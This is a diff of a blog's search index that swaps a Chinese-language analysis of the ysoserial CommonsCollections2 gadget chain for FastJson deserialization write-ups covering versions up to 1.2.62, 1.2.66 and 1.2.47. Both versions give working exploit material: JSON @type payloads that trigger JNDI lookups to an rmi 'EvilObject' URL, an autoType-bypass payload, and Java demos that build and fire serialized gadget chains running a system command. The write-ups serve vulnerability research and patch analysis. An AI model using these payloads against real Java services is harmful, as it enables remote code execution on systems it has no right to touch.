+    <title>FastJson反序列化回顾系列(七)</title>
+    <url>/2020/05/17/fastjson-7/</url>
+    <content><![CDATA[<p>此后从1.2.48-1.2.68都是基于黑名单绕过的思路来进行利用的。此次介绍fastjson&lt;=1.2.62版本和fastjson&lt;=1.2.66版本的利用方式。</p>
 <a id="more"></a>
 
-<p>前面已经分析过的文章</p>
-<p><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a></p>
-<p>与CommonsCollections3一样的是，它也是利用<code>TemplatesImpl</code>来进行最终的命令执行<font color=#008000>(commons-collections:4.0版本下的利用链利用的都是<code>TemplatesImpl</code>)</font>。不同的是它用到了一个新类<code>PriorityQueue</code>来触发transform函数。<code>PriorityQueue</code>类。这个类有什么作用呢？让我们来分析分析。</p>
-<p>整个反序列化利用链如下所示:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	-&gt;PriorityQueue.readObject()</span><br><span class="line">		-&gt;PriorityQueue.heapify()</span><br><span class="line">			-&gt;PriorityQueue.siftDown()</span><br><span class="line">				-&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">					-&gt;TransformingComparator.compare()</span><br><span class="line">						-&gt;InvokerTransformer.transform()</span><br><span class="line">							-&gt;TemplatesImpl.newTransform()</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>首先在反序列化的过程中所需要用的类必须实现了<code>Serilizable</code>类。<code>PriorityQueue</code>也不例外。观察它的<code>readObject</code>类。</p>
+<h1 id="fastjson-lt-1-2-62"><a href="#fastjson-lt-1-2-62" class="headerlink" title="fastjson&lt;=1.2.62"></a>fastjson&lt;=1.2.62</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li>fastjson &lt;= 1.2.62</li>
+</ul>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>开启autoType</li>
+<li>依赖第三方包ibatis-sqlmap</li>
+<li>依赖第三方包Jta</li>
+</ul>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先定位到<code>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig</code>类的setProperties函数</p>
 <p><img src="1.png" alt=""></p>
-<p>前面的几行都是普通的反序列化函数，让我们直接看看<code>heapify</code>。</p>
+<p>可以看到有完整的一套jndi注入，只需要考虑utxName是否可控。utxName来源于props.get(“UserTransaction”)。因此需要传入一个Properties类，其UserTransaction的值为jndi注入的uri。</p>
+<h2 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h2><p>根据上述的分析，exp构造如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,</span><br><span class="line">  &quot;properties&quot;: &#123;</span><br><span class="line">                  &quot;UserTransaction&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">                &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p>补丁的方式非常的简单粗暴，就是将此类加入黑名单中。</p>
+<h1 id="fastjson-lt-1-2-66"><a href="#fastjson-lt-1-2-66" class="headerlink" title="fastjson&lt;=1.2.66"></a>fastjson&lt;=1.2.66</h1><h2 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
+<li>fastjson &lt;= 1.2.66</li>
+</ul>
+<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>开启autoType</li>
+<li>依赖第三方包shiro</li>
+<li>依赖第三方包slf4j-simple</li>
+</ul>
+<p>OR</p>
+<ul>
+<li>开启autoType</li>
+<li>依赖第三方包Anteros-DBCP</li>
+<li>依赖第三方包Anteros-Core</li>
+</ul>
+<p>OR</p>
+<ul>
+<li>开启autoType</li>
+<li>依赖第三方包ignite-jta-incubating</li>
+</ul>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="JndiObjectFactory"><a href="#JndiObjectFactory" class="headerlink" title="JndiObjectFactory"></a>JndiObjectFactory</h3><h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>先定位到<code>org.apache.shiro.jndi.JndiObjectFactory</code>类的getInstance()函数。</p>
 <p><img src="2.png" alt=""></p>
-<p><code>heapify</code>函数连直接调用了<code>siftDown</code>，跟进<code>siftDown</code>。</p>
+<p>这里的this.lookup事实上也是调用了JndiTemplate.lookup()函数，满足jndi注入的环境。那么就需要控制this.resourceName的值为jndi注入的uri即可。</p>
+<p>在利用这条链时，反序列化需要使用parseObject。因为parseObject需要返回JSONObject类型的对象，在使用toJSON进行转换的时候会遍历其字段，并调用getter获取value放入Map，从而调用到了getInstance方法。</p>
+<h4 id="exp构造"><a href="#exp构造" class="headerlink" title="exp构造"></a>exp构造</h4><p>根据上述分析，exp如下所示:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,</span><br><span class="line">  &quot;resourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="AnterosDBCPConfig"><a href="#AnterosDBCPConfig" class="headerlink" title="AnterosDBCPConfig"></a>AnterosDBCPConfig</h3><h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>首先定位到<code>br.com.anteros.dbcp.AnterosDBCPConfig</code>类，通过搜寻lookup函数，可以定位到其getObjectOrPerformJndiLookup()函数。</p>
 <p><img src="3.png" alt=""></p>
-<p>若<code>comparator</code>不为空，则进入了<code>SiftDownUsingComparator</code>函数，跟进它。</p>
+<p>可以看到他有一个完整的JNDI注入环境。但是由于该函数是private类型，因此不能在反序列化时直接被调用，继续寻找一个调用此函数的方法。定位到setMetricRegistry()函数，如下所示:</p>
 <p><img src="4.png" alt=""></p>
-<p>在<code>SiftDownUsingComparator</code>函数中，继续跟进<code>comparator.compare</code>函数。此时进入的是<code>TransformingComparator</code>的compare函数，如下所示</p>
+<p>它调用了getObjectOrPerformJndiLookup()函数。只需要将metricRegistry的值设置为jndi注入的uri值。</p>
+<h4 id="exp构造-1"><a href="#exp构造-1" class="headerlink" title="exp构造"></a>exp构造</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,</span><br><span class="line">	&quot;metricRegistry&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="CacheJndiTmLookup"><a href="#CacheJndiTmLookup" class="headerlink" title="CacheJndiTmLookup"></a>CacheJndiTmLookup</h3><p>首先定位到<code>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup</code>类。如下所示:</p>
 <p><img src="5.png" alt=""></p>
-<p>在这里就看到了熟悉的<code>this.transformer.transform()</code>。在CommonsCollections2中利用的是<code>InvokerTransformer</code>的反射机制来调用<code>newTransformer</code>函数，从而进入利用TemplatesImpl对象的RCE。除了InvokerTransformer外，CommonsCollection3中的<code>InstantiateTransformer</code>触发<code>TrAXFilter</code>初始化也能达到同样的效果，不过这是CommonsCollections4使用的方法。</p>
-<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>根据上面的分析可以得知，需要指定<code>PriorityQueue</code>类的<code>comparator</code>变量为<code>TransformingComparator</code>类，而<code>TransformingComparator</code>类中的Transformer需要是<code>InvokerTransformer</code>。很容易写出如下的payload</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br></pre></td></tr></table></figure>
+<p>该类比较简单，在getTm()函数中存在JNDI注入的整个环境，其中jndi的uri即代码中的s来源于jndiNames，因此只需要将jndiNames中的值放入一个jndi注入的uri即可。</p>
+<h4 id="exp构造-2"><a href="#exp构造-2" class="headerlink" title="exp构造"></a>exp构造</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,</span><br><span class="line">	&quot;jndiNames&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;EvilObject&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><code>newTransformer</code>函数的主体是TemplatesImpl对象，因此传入<code>this.transformer.transform(obj)</code>中的obj是一个TemplatesImpl对象。而该对象是PriorityQueue类的queue成员变量。因此，需要实例化一个PriorityQueue类，其成员变量comparator是一个TransformingComparator对象，成员变量queue是一个TemplatesImpl对象。</p>
-<p>可以看到在<code>PriorityQueue</code>类中，<code>queue</code>这个成员变量被<code>transient</code>关键字修饰，是不能被序列化的。但是在<code>PriorityQueue</code>类的writeObject方法中，首先调用了ObjectOutputStream中的defaultWriteObject方法，该方法会执行默认的序列化机制，在进行序列化时，会先忽略掉被<code>transient</code>修饰的queue字段。然后调用了<code>writeObject</code>方法显示地将queue字段写入到ObjectOutputStream中。</p>
+<h2 id="补丁-1"><a href="#补丁-1" class="headerlink" title="补丁"></a>补丁</h2><p>增加黑名单。而且在1.2.68也就是最新版本中增加了新的安全参数Safe_mode。打开这个模式之后直接禁用autoType功能。虽然有这个Safe_mode，如果开启这个模式的话，相当于禁用了@type fastjson反序列化这个功能。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://drops.blbana.cc/2020/04/16/Fastjson%E5%8E%86%E5%8F%B2%E8%A1%A5%E4%B8%81Bypass%E5%88%86%E6%9E%90/#%E7%89%88%E6%9C%AC1-2-47" target="_blank" rel="noopener">Fastjson历史补丁Bypass分析</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>FastJson反序列化回顾系列(六)</title>
+    <url>/2020/05/17/fastjson-6/</url>
+    <content><![CDATA[<p>1.2.46版本中将<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>添加进黑名单，使得利用失败。此时出现了不开启<code>autotype</code>的情况下成功的绕过checkAutoType，且通杀1.2.47以前的所有版本。</p>
+<a id="more"></a>
+
+<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>fastjson &lt;= 1.2.47</li>
+</ul>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>该漏洞是通过绕过了checkAutoType的检查，从而成功利用。这个时候先来看看之前提到过的四块。</p>
+<p><img src="1.png" alt=""><br><img src="2.png" alt=""></p>
+<p>之前在fastjson回顾系列二中利用的是autotype开启的情况下，最终进入红框的loadClass，从而RCE的。而此次利用的是autotype未开启的情况下，利用第二个绿色框来达到RCE的。接下来具体看看</p>
+<p>它首先利用了<code>java.lang.class</code>这个类，它并不在黑名单，所以可以过checkAutotype。过了checkAutotype之后，它对应的deserializer为<code>MiscCodeC</code>。如下所示:</p>
+<p><img src="3.png" alt=""></p>
+<p>跟进deserialze函数</p>
+<p><img src="4.png" alt=""></p>
+<p>在经过判断lexer.stringVal()的值是”val”为真的情况下，经过parser.parse()，取出其值，即”com.sun.rowset.JdbcRowSetImpl”。如下所示:</p>
+<p><img src="5.png" alt=""></p>
+<p>接着往下走，经过一系列判断，最终到达<code>TypeUtils.loadClass</code>函数。</p>
 <p><img src="6.png" alt=""></p>
-<p>查看<code>PriorityQueue</code>类的构造函数，需要两个参数，需要注意的是<code>initCapacity</code>在其注释中有说明需要1.5的Capacity，因此在初始化时将其设为2。初始化的代码如下：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+<p>此时的strVal为前面获取到的”com.sun.rowset.JdbcRowSetImpl”，跟进它</p>
+<p><img src="7.png" alt=""></p>
+<p>由于cache值默认为<code>true</code>，则进入mapping.put(className,clazz)，将”com.sun.rowset.JdbcRowSetImpl”与com.sun.rowset.JdbcRowSetImpl类对应起来。</p>
+<p>然后继续反序列化，直接解析到<code>{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}</code>时，进入checkAutoType函数，由于autotype默认是关闭的，因此直接进入绿色的框，如下所示：</p>
+<p><img src="8.png" alt=""></p>
+<p>跟进getClassFromMapping()函数。</p>
+<p><img src="9.png" alt=""></p>
+<p>此时clazz为<code>com.sun.rowset.JdbcRowSetImpl</code>类从而直接return了。</p>
+<p><img src="10.png" alt=""></p>
+<p>到这里为止就绕过了checkAutoType的检查，后续就与之前一致了。</p>
+<h1 id="EXP构造"><a href="#EXP构造" class="headerlink" title="EXP构造"></a>EXP构造</h1><p>根据上面的分析，exp分为2部分，一部分是将”com.sun.rowset.JdbcRowSetImpl”放入mapping中，另一个就是正常的获取到”com.sun.rowset.JdbcRowSetImpl”，且调用setAutoCommit函数。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;a&quot;:&#123;</span><br><span class="line">			&quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">			&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">		&#125;,</span><br><span class="line">	&quot;b&quot;:&#123;</span><br><span class="line">			&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">			&quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;EvilObject&quot;,</span><br><span class="line">			&quot;autoCommit&quot;:true	</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>然后queue里面的值为TemplatesImpl对象，使用CommonsCollections3中的构造方法，然后对Priority类中的queue成员进行设置。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] queue = &#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"> </span><br><span class="line">Field field6 = priorityQueue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">field6.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field6.set(priorityQueue,queue);</span><br></pre></td></tr></table></figure>
-
+<p>完整的demo:</p>
+<p>jdbcrowsetimpl5</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@dependency&#123;fastjson:1.2.47&#125;</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jdbcrowsetimpl5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">"&#123;\"a\":&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,\"b\":&#123;\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/EvilObject\",\"autoCommit\":true&#125;&#125;&#125;"</span>;</span><br><span class="line">        Object res = JSON.parse(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>ysoserial中实例化InvokerTransformer类时，它首先调用的toString方法，然后才将其换成newTransformer方法。这是因为在前面<code>priorityQueue.add(1)</code>也会调用到InvokerTransformer，这时候Integrity对象1并没有newTransformer方法会报错。</p>
+<p>所有在黑名单中的类都可以用这种方式绕过，包括<code>TemplatesImpl</code>和<code>JndiDataSourceFactory</code></p>
 </blockquote>
-<h3 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">         String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">         String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                 command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                 <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">         Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">         ClassPool pool = ClassPool.getDefault();</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">         clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">         CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">         clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">         Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">         field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">         Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">         field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field2.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">         Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">         field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//create templates</span></span><br><span class="line"></span><br><span class="line">         InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">         TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">         PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">         Object[] queue = &#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field field5 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field5.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field5.set(transformer, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        Field field6 = priorityQueue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field6.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field6.set(priorityQueue,queue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(priorityQueue);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>再加上ysoserial中的classFiles.java。运行结果如下:</p>
-<p><img src="7.png" alt=""></p>
+<h1 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h1><p>1.2.48版本中修复了1.2.47的绕过，在MiscCodec，设置了cache为false。<br><img src="11.png" alt=""></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="http://blog.0kami.cn/2019/11/05/study-java-deserialized-commonscollections4/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections2,4,8</a></li>
-<li><a href="https://www.cnblogs.com/tr1ple/p/12382559.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(2)</a></li>
+<li><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/#v1-2-47" target="_blank" rel="noopener">FastJson 反序列化学习#1.2.47</a></li>
 </ul>
 ]]></content>
       <categories>
